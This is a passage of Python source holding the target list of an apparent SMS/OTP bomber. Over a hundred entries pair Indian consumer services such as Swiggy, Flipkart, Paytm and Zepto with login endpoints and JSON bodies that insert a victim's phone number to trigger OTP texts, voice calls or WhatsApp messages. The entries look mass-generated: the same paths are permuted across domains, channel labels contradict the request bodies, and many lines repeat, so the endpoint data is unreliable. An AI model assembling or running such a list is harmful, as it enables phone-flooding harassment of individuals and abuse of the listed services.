    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': '1Mg Call', 'url': 'https://1mg.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Cred Call', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
